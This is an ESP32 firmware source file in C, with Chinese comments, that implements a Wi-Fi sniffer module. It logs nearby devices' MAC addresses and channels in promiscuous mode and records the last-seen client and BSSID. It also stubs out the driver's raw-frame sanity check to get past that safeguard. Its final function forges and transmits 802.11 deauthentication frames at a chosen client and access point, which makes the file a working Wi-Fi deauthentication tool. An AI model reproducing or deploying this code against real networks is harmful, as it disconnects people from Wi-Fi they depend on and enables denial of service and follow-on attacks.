#include "fml_wifisniffer.h"
#include "fml_sharedata.h"
#include "freertos/FreeRTOS.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_log.h"
#include <string.h>

/**< STRUCT---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/
typedef struct _fml_wifisniffer_t
{
    TaskHandle_t                        task_handle;                                                        //任务句柄
    StackType_t                         task_stack[FML_WIFISNIFFER_STK_SIZE];                               //任务栈
    StaticTask_t                        task_tcb;                                                           //任务控制块
    uint8_t                             channel;                                                            //当前通道
    uint32_t                            channel_interval;                                                   //通道间隔
    int                                 max_rssi;                                                           //最大的RSSI值
    wifi_ieee80211_mac_hdr_t            mac_hdr;                                                            //物理地址头
    uint8_t                             pkt_type;                                                           //帧类型
    uint8_t                             dev_channel;                                                        //当前通道
    fml_sharedata_Handle_t              sharedata_handle;                                                   //自身结构体句柄
} fml_wifisniffer_t;

/**< VARIABLE---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/
static fml_wifisniffer_t ob_fml_wifisniffer;

/**< STATICFUN---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/
/**
 * @brief Decomplied function that overrides original one at compilation time.
 * 
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}
static char* fml_wifisniffer_wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type);
static void fml_wifisniffer_wifi_sniffer_packet_handler(void *buff, wifi_promiscuous_pkt_type_t type);
static void fml_wifisniffer_wifi_sniffer_init(void);
static void fml_wifisniffer_wifi_sniffer_set_channel(uint8_t channel);
static void fml_wifisniffer_task(void *parameter);

static char* fml_wifisniffer_wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type)
{
    switch(type)
    {
        case WIFI_PKT_MGMT: return "MGMT";
        case WIFI_PKT_DATA: return "DATA";
        default:
        case WIFI_PKT_MISC: return "MISC";
    }

    return NULL;
}

static void fml_wifisniffer_wifi_sniffer_packet_handler(void *buff, wifi_promiscuous_pkt_type_t type)
{
    //if(type != WIFI_PKT_CTRL)return;
    int max_rssi;
    uint8_t pkt_type;
    uint8_t dev_channel;
    const wifi_promiscuous_pkt_t    *ppkt = (wifi_promiscuous_pkt_t *)buff;
    const wifi_ieee80211_packet_t   *ipkt = (wifi_ieee80211_packet_t *)ppkt->payload;
    const wifi_ieee80211_mac_hdr_t  *hdr = &ipkt->hdr;

    fml_sharedata_Getting(ob_fml_wifisniffer.sharedata_handle, 
                            OFFSET(fml_wifisniffer_t,max_rssi), 
                            (uint8_t*)&max_rssi, 
                            sizeof(max_rssi), 
                            0);
    printf("max_rssi:%d...\n",max_rssi);
    if(ppkt->rx_ctrl.rssi < max_rssi)return;
    pkt_type = type;
    dev_channel = ppkt->rx_ctrl.channel;
    fml_sharedata_Setting(ob_fml_wifisniffer.sharedata_handle, OFFSET(fml_wifisniffer_t,mac_hdr), (uint8_t*)hdr, sizeof(wifi_ieee80211_mac_hdr_t), 0);
    fml_sharedata_Setting(ob_fml_wifisniffer.sharedata_handle, OFFSET(fml_wifisniffer_t,pkt_type), (uint8_t*)&pkt_type, sizeof(pkt_type), 0);
    fml_sharedata_Setting(ob_fml_wifisniffer.sharedata_handle, OFFSET(fml_wifisniffer_t,dev_channel), (uint8_t*)&dev_channel, sizeof(dev_channel), 0);

    printf("MODE=%02d, FRAMECTRL=%02x, PACKET TYPE=%s, CHAN=%02d, RSSI=%02d,"
            " ADDR1=%02x:%02x:%02x:%02x:%02x:%02x,"
            " ADDR2=%02x:%02x:%02x:%02x:%02x:%02x,"
            " ADDR3=%02x:%02x:%02x:%02x:%02x:%02x\n",
            ppkt->rx_ctrl.sig_mode,
            hdr->frame_ctrl,
            fml_wifisniffer_wifi_sniffer_packet_type2str(type),
            ppkt->rx_ctrl.channel,
            ppkt->rx_ctrl.rssi,
            /* ADDR1 */
            hdr->addr1[0],hdr->addr1[1],hdr->addr1[2],
            hdr->addr1[3],hdr->addr1[4],hdr->addr1[5],
            /* ADDR2 */
            hdr->addr2[0],hdr->addr2[1],hdr->addr2[2],
            hdr->addr2[3],hdr->addr2[4],hdr->addr2[5],
            /* ADDR3 */
            hdr->addr3[0],hdr->addr3[1],hdr->addr3[2],
            hdr->addr3[3],hdr->addr3[4],hdr->addr3[5]
        );

    // //原始数据
    // printf("raw data[%d]: ",ppkt->rx_ctrl.sig_len);
    // for(int i=0; i<ppkt->rx_ctrl.sig_len; i++)
    // {
    //     printf("%x ",ppkt->payload[i]);
    // }
    // printf("\n");
}

static void fml_wifisniffer_wifi_sniffer_init(void)
{
    esp_wifi_set_promiscuous_rx_cb(&fml_wifisniffer_wifi_sniffer_packet_handler);
}

static void fml_wifisniffer_wifi_sniffer_set_channel(uint8_t channel)
{
    esp_wifi_set_channel(channel,WIFI_SECOND_CHAN_NONE);
}

static void fml_wifisniffer_task(void *parameter)
{
    uint8_t channel;
    uint32_t channel_interval;

    //setup
    fml_wifisniffer_wifi_sniffer_init();

    while(1)
    {
        //printf("fml_wifisniffer_task running...\n");
        fml_sharedata_Getting(ob_fml_wifisniffer.sharedata_handle, OFFSET(fml_wifisniffer_t,channel), (uint8_t*)&channel, sizeof(channel), portMAX_DELAY);
        fml_wifisniffer_wifi_sniffer_set_channel(channel);
        channel = (channel % FML_WIFISNIFFER_WIFI_CHANNEL_MAX) + 1;
        fml_sharedata_Setting(ob_fml_wifisniffer.sharedata_handle, OFFSET(fml_wifisniffer_t,channel), (uint8_t*)&channel, sizeof(channel), portMAX_DELAY);
        fml_sharedata_Getting(ob_fml_wifisniffer.sharedata_handle, OFFSET(fml_wifisniffer_t,channel_interval), (uint8_t*)&channel_interval, sizeof(channel_interval), portMAX_DELAY);
        // if(ob_fml_wifisniffer.task_handle != NULL)printf("Task = %d\n",uxTaskGetStackHighWaterMark(ob_fml_wifisniffer.task_handle));
        // else printf("ob_fml_wifisniffer.task_handle is NULL\n");
        vTaskDelay(channel_interval / portTICK_PERIOD_MS);  
    }
} 


/**< API---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/
/*
*@fn        fml_wifisniffer_init
*@brief     WIFI嗅探初始化
*@param     none
*@return    错误码
*/
int fml_wifisniffer_init(void)
{
    int ret = 0;
    
    portMUX_TYPE lock = portMUX_INITIALIZER_UNLOCKED;

    taskENTER_CRITICAL(&lock);           //进入临界区

    //初始化结构体
    memset(&ob_fml_wifisniffer, 0, sizeof(ob_fml_wifisniffer));
    ob_fml_wifisniffer.channel = 1;
    ob_fml_wifisniffer.channel_interval = FML_WIFISNIFFER_WIFI_CHANNEL_SWITCH_INTERVAL;
    ob_fml_wifisniffer.max_rssi = 255;

    //初始化任务
    ob_fml_wifisniffer.task_handle = xTaskCreateStatic((TaskFunction_t)fml_wifisniffer_task,            //任务函数
                                                        (const char*)FML_WIFISNIFFER_TASK_NAME,         //任务名称
                                                        (uint32_t)FML_WIFISNIFFER_STK_SIZE,             //任务堆栈大小
                                                        (void*)NULL,                                    //传递给任务函数的参数
                                                        (UBaseType_t)FML_WIFISNIFFER_TASK_PRIO,         //任务优先级
                                                        (StackType_t*)&ob_fml_wifisniffer.task_stack,   //任务堆栈
                                                        (StaticTask_t*)&ob_fml_wifisniffer.task_tcb);   //任务控制块

    if(NULL != ob_fml_wifisniffer.task_handle)ret = 0;
    else ret = -1;

    fml_sharedata_GlobalData_t sharedata;
    sharedata.global_data = (uint8_t*)&ob_fml_wifisniffer;
    sharedata.global_data_len = sizeof(ob_fml_wifisniffer);
    ob_fml_wifisniffer.sharedata_handle = fml_sharedata_Register(sharedata);
    if(ob_fml_wifisniffer.sharedata_handle == NULL)ret = -1;

    taskEXIT_CRITICAL(&lock);            //退出临界区

    return ret;
}

/*
*@fn        fml_wifisniffer_stop
*@brief     停止嗅探
*@param     none
*@return    错误码
*/
int fml_wifisniffer_stop(void)
{
    esp_wifi_set_promiscuous(false);
    return 0;
}

/*
*@fn        fml_wifisniffer_start
*@brief     开始嗅探
*@param     none
*@return    错误码
*/
int fml_wifisniffer_start(void)
{
    esp_wifi_set_promiscuous(true);
    return 0;
}

/*
*@fn        fml_wifisniffer_SetChannelInterval
*@brief     设置通道间隔时间
*@param     interval                -[in]           间隔时间
*@return    错误码
*/
int fml_wifisniffer_SetChannelInterval(uint32_t interval)
{
    return fml_sharedata_Setting(ob_fml_wifisniffer.sharedata_handle, OFFSET(fml_wifisniffer_t,channel_interval), (uint8_t*)&interval, sizeof(interval), 0);
}

/*
*@fn        fml_wifisniffer_SetRssi
*@brief     设置RSSI的范围: 0 ~ max_rssi
*@param     max_rssi                -[in]           最大rssi值
*@return    错误码
*/
int fml_wifisniffer_SetRssi(int max_rssi)
{
    return fml_sharedata_Setting(ob_fml_wifisniffer.sharedata_handle, OFFSET(fml_wifisniffer_t,max_rssi), (uint8_t*)&max_rssi, sizeof(max_rssi), 0);
}

/*
*@fn        fml_wifisniffer_GetLastDevAddr
*@brief     获取最近一次捕捉的设备地址
*@param     buf                     -[out]          返回的地址缓冲区
*@param     len                     -[in]           缓冲区大小
*@return    错误码
*/
int fml_wifisniffer_GetLastDevAddr(char *buf, uint8_t len)
{
    uint8_t pkt_type;
    wifi_ieee80211_mac_hdr_t mac_hdr;//物理地址头

    if(len < 6 || buf == NULL)return -1;
    if(fml_sharedata_Getting(ob_fml_wifisniffer.sharedata_handle, OFFSET(fml_wifisniffer_t,mac_hdr), (uint8_t*)&mac_hdr, sizeof(mac_hdr), 0) != 0)return -1;
    if(fml_sharedata_Getting(ob_fml_wifisniffer.sharedata_handle, OFFSET(fml_wifisniffer_t,pkt_type), (uint8_t*)&pkt_type, sizeof(pkt_type), 0) != 0)return -1;

    switch(pkt_type)
    {
        case WIFI_PKT_DATA:
        if((mac_hdr.frame_ctrl & 0x80) == 0x80) memcpy((void*)buf,mac_hdr.addr2,6);
        else return -1;
        break;

        default:
        break;
    }

    return 0;
}

/*
*@fn        fml_wifisniffer_GetLastDevBssId
*@brief     获取最近一次捕捉的设备bssid
*@param     buf                     -[out]          返回的地址缓冲区
*@param     len                     -[in]           缓冲区大小
*@return    错误码
*/
int fml_wifisniffer_GetLastDevBssId(char *buf, uint8_t len)
{
    uint8_t pkt_type;
    wifi_ieee80211_mac_hdr_t mac_hdr;//物理地址头

    if(len < 6 || buf == NULL)return -1;
    if(fml_sharedata_Getting(ob_fml_wifisniffer.sharedata_handle, OFFSET(fml_wifisniffer_t,mac_hdr), (uint8_t*)&mac_hdr, sizeof(mac_hdr), 0) != 0)return -1;
    if(fml_sharedata_Getting(ob_fml_wifisniffer.sharedata_handle, OFFSET(fml_wifisniffer_t,pkt_type), (uint8_t*)&pkt_type, sizeof(pkt_type), 0) != 0)return -1;

    switch(pkt_type)
    {
        case WIFI_PKT_DATA:
        if((mac_hdr.frame_ctrl & 0x80) == 0x80) memcpy((void*)buf,mac_hdr.addr1,6);
        else return -1;
        break;

        default:
        break;
    }

    return 0;
}

/*
*@fn        fml_wifisniffer_GetLastDevChannel
*@brief     获取最近一次捕捉的设备所在通道
*@param     buf                     -[out]          返回的通道
*@return    错误码
*/
int fml_wifisniffer_GetLastDevChannel(uint8_t *buf)
{
    return fml_sharedata_Getting(ob_fml_wifisniffer.sharedata_handle, OFFSET(fml_wifisniffer_t,dev_channel), buf, sizeof(ob_fml_wifisniffer.dev_channel), 0);
}

/*
*@fn        fml_wifisniffer_SendDeauthFrame
*@brief     发送解除认证帧
*@param     dst                     -[in]           目标地址
*@param     dlen                    -[in]           目标地址大小
*@param     bssid                   -[in]           目标网络地址
*@param     blen                    -[in]           目标网络地址大小
*@return    错误码
*/
int fml_wifisniffer_SendDeauthFrame(char *dst, uint8_t dlen, char *bssid, uint8_t blen)
{
    static uint8_t deauth_frame_default[] = {
        0xC0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xf0, 0xff, 0x02, 0x00
    };

    static uint8_t nulldata[] = 
    {
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    };

    if(dst == NULL || bssid == NULL || dlen < 6 || blen < 6)return -1;

    if(memcmp(nulldata,dst,6) == 0 || memcmp(nulldata,bssid,6) == 0)return -1;

    memcpy(&deauth_frame_default[4], dst, dlen);
    memcpy(&deauth_frame_default[10], bssid, blen);
    memcpy(&deauth_frame_default[16], bssid, blen);

    printf("devaddr=%02x:%02x:%02x:%02x:%02x:%02x\n",dst[0],
                                                        dst[1],
                                                        dst[2],
                                                        dst[3],
                                                        dst[4],
                                                        dst[5]);
    printf("bassid=%02x:%02x:%02x:%02x:%02x:%02x\n",bssid[0],
                                                    bssid[1],
                                                    bssid[2],
                                                    bssid[3],
                                                    bssid[4],
                                                    bssid[5]);  
    printf("channel=%d\n",ob_fml_wifisniffer.channel);                                          


    if(esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false) != ESP_OK)return -1;

    return 0;
}



















